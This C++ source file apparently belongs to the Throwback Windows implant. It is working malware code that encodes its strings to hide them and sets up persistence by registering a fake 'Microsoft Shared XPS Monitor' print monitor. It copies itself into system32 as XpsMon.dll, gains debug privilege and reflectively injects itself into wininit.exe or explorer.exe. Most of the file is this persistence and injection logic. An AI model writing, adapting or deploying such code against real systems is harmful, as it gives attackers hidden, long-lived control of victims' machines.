#include "stdafx.h"
#include "ReflectiveLoader.h"
#include "ThrowbackDLL.h"
#include <Windows.h>
#include "..\Throwback\Throwback.h"
#include <string>

// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
extern "C" HINSTANCE hAppInstance;
extern "C" __declspec(dllexport) int __cdecl WPrintInit();
EXTERN_C IMAGE_DOS_HEADER __ImageBase;


DWORD RunDll()
{
	TCHAR strDllPath[MAX_PATH] = {0};
	BYTE *dll;
	HANDLE dllHandle;
	DWORD bytesRead = 0;
	LARGE_INTEGER size;
	DWORD pid = 0;
	WIN32_FILE_ATTRIBUTE_DATA fad;
	DWORD dwResult = 0;

	GetModuleFileName((HINSTANCE)&__ImageBase, strDllPath, MAX_PATH);
	//OutputDebugString(strDllPath);
	dllHandle = CreateFile(strDllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

	//IF THE FILE DOESN'T EXIST ON DISK, THEN WE'VE BEEN RDI'ed AND LET'S ROLL!!
	if(dllHandle == INVALID_HANDLE_VALUE) 
	{ 
		//OutputDebugString(L"ERROR OPENING FILE!!"); 
		return 1;
	}

	if(!GetFileAttributesEx(strDllPath, GetFileExInfoStandard, &fad)) return 1;
	size.HighPart = fad.nFileSizeHigh;
	size.LowPart = fad.nFileSizeLow;
	dll = new BYTE[size.QuadPart];
	dwResult = ReadFile(dllHandle, dll, size.QuadPart, &bytesRead, NULL);
	
	if(dwResult == 0) 
	{ 
		//OutputDebugString(L"ERROR READING FILE!!"); 
		return 1; 
	}
	
	//CLOSE FILE HANDLE
	if(dllHandle) CloseHandle(dllHandle);

	//OutputDebugString(L"THE DLL IS LOADED");

	//LOOP UNTIL WE HAVE A PID
	while(TRUE)
	{
		dwResult = enableSEPrivilege(SE_DEBUG_NAME);
		if(dwResult == 1) pid = findPid(L"wininit.exe");
		else pid = findPid(L"explorer.exe");
		
		if(pid != 0) break;
		else Sleep(10000);

	}

	dwResult = runReflector(dll, size.QuadPart, pid);
	if(dwResult != 0)
	{
		return 1;
	}

	//fAddr = GetProcAddress(dLib, "WProcInit");
	//OutputDebugString(L"FOUND ADDRESS OF WProcInit()");

	//hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)fAddr, 0, 0, &threadId); 
	
	return 0;

}


extern "C" __declspec( dllexport ) int WPrintInit()
{
	HKEY keyHandle1 = NULL;
	HKEY keyHandle2 = NULL; 
	HKEY keyRes1 = NULL;
	DWORD dwResult = 0;
	TCHAR wStrDllPath[MAX_PATH] = {0};
	char *xpsDll = "XpsMon.dll";

	do
	{
		//OutputDebugString(L"LOADING PERSISTENCE!");
		//INSTALL PERSISTENCE
		//SYSTEM\CurrentControlSet\Control\Print\Monitors
		int printerCode[] = {2,8,2,5,20,28,13,18,36,35,35,52,63,37,18,62,63,37,35,62,61,2,52,37,13,18,62,63,37,35,62,61,13,1,35,56,63,37,13,28,62,63,56,37,62,35,34};
		std::wstring printerList = decryptString(printerCode, (sizeof(printerCode)/sizeof(int)));
		keyHandle1 = regOpenKey(HKEY_LOCAL_MACHINE, printerList.c_str(), KEY_ALL_ACCESS);
		if(keyHandle1 == NULL) return 1;
		//OutputDebugString(L"OPENED Monitors");

		//Microsoft Shared XPS Monitor
		int monitorCode[] = {28,56,50,35,62,34,62,55,37,113,2,57,48,35,52,53,113,9,1,2,113,28,62,63,56,37,62,35};
		std::wstring monitorList = decryptString(monitorCode, (sizeof(monitorCode)/sizeof(int)));
		RegCreateKey(keyHandle1, monitorList.c_str(), &keyRes1);
		//OutputDebugString(L"CREATED Microsoft Shared XPS Monitor");

		//SYSTEM\CurrentControlSet\Control\Print\Monitors\Microsoft Shared XPS Monitor
		int installCode[] = {2,8,2,5,20,28,13,18,36,35,35,52,63,37,18,62,63,37,35,62,61,2,52,37,13,18,62,63,37,35,62,61,13,1,35,56,63,37,13,28,62,63,56,37,62,35,34,13,28,56,50,35,62,34,62,55,37,113,2,57,48,35,52,53,113,9,1,2,113,28,62,63,56,37,62,35};
		std::wstring installList = decryptString(installCode, (sizeof(installCode)/sizeof(int)));
		keyHandle2 = regOpenKey(HKEY_LOCAL_MACHINE, installList.c_str(), KEY_ALL_ACCESS);
		if(keyHandle2 == NULL) { dwResult = 1; break; }
		//OutputDebugString(L"OPENED Microsoft Shared Fax Monitor");

		/**
		GetModuleFileNameA((HINSTANCE)&__ImageBase, strDllPath, MAX_PATH);
		std::string pName = strDllPath;
		OutputDebugStringA(pName.c_str());
		if(pName.find("\\") != -1)
		{
			int begin = pName.find_last_of("\\");
			pName = pName.substr(begin + 1, pName.length());
		}
		OutputDebugStringA(pName.c_str());
		**/

		//std::wstring pName = decryptString(xpsFile, (sizeof(xpsFile)/sizeof(int)));
		
		if(RegSetValueExA(keyHandle2, "Driver", 0, REG_SZ, (BYTE *)xpsDll, strlen(xpsDll)) != ERROR_SUCCESS) { dwResult = 1; break; }
		//OutputDebugString(L"SET Driver FOR Microsoft Shared Fax Monitor");

		//NOW COPY DLL TO %SYSTEM32%
		wchar_t filePath[MAX_PATH] = L"";
		int strLen = GetEnvironmentVariable(L"SystemRoot", filePath, MAX_PATH);
		std::wstring pPath = filePath;

		// \system32\ 
		int commonFileName[] = {13,34,40,34,37,52,60,98,99,13};
		pPath.append(decryptString(commonFileName, (sizeof(commonFileName)/sizeof(int))));

		// XpsMon.dll
		int xpsFile[] = {9,33,34,28,62,63,127,53,61,61};
		pPath.append(decryptString(xpsFile, (sizeof(xpsFile)/sizeof(int))));
		
		//ENDS UP BEING C:\windows\system32\xpsmon.dll
		GetModuleFileName((HINSTANCE)&__ImageBase, wStrDllPath, MAX_PATH);
		DeleteFile(pPath.c_str());
		dwResult = CopyFile(wStrDllPath, pPath.c_str(), FALSE);

		//CopyFile RETURNS > 0 ON SUCCESS
		if(dwResult != 0) dwResult = 0;
		else dwResult = 1;

		//OutputDebugString(pPath.c_str());
		
		//NOW KICK OFF THROWBACK!
		enableSEPrivilege(SE_DEBUG_NAME);
		dwResult = RunDll();
	
		//IF RunDll() FAILS, THEN JUST RUN TB
		if(dwResult == 1)
		{
			//OutputDebugString(L"RunDll() FAILED?!?");
			WProcInit();
		}

		Sleep(2000);

	} while(0);

	if(keyHandle1) RegCloseKey(keyHandle1);
	if(keyHandle2) RegCloseKey(keyHandle2);
	if(keyRes1) RegCloseKey(keyRes1);

	return dwResult;
}


//===============================================================================================//
BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;
	DWORD dwResult = 0;
	//std::wstring exeFileName;
	//TCHAR szExeFileName[MAX_PATH] = {0};
	HANDLE tdHandle = NULL; 

	switch( dwReason ) 
    { 
		case DLL_QUERY_HMODULE:
			if( lpReserved != NULL )
				*(HMODULE *)lpReserved = hAppInstance;
			break;
		case DLL_PROCESS_ATTACH:

			hAppInstance = hinstDLL;

			OutputDebugString(L"IN DllMain");
			
			//GetModuleFileName(NULL, szExeFileName, MAX_PATH);
			//OutputDebugString(szExeFileName);
			//exeFileName = szExeFileName;

			WProcInit();

			OutputDebugString(L"SLEEPING");
			Sleep(5000);
			//tdHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WProcInit, lpReserved, 0, &dwResult);
			
			/**
			//IF WE'RE NOT RUNNING UNDER rundll32 THEN LET'S ROLL!
			if(exeFileName.find(L"rundll32.exe") == -1)
			{
				dwResult = RunDll();
	
				//IF RunDll() FAILS, THEN JUST RUN TB
				if(dwResult == 1)
				{
					WProcInit();
				}
			}
			**/


			break;

			//MessageBoxA( NULL, "Hello from DllMain!", "Reflective Dll Injection", MB_OK );
			//pid = GetCurrentProcessId();
			//_snprintf(tmp, 32, "RUNNING FROM PID %d!", pid);
			//OutputDebugString(tmp);
			
			//InitDll();
			//h = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WProcInit, lpReserved, 0, &tid);
			//WProcInit();
			//return TRUE;

		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}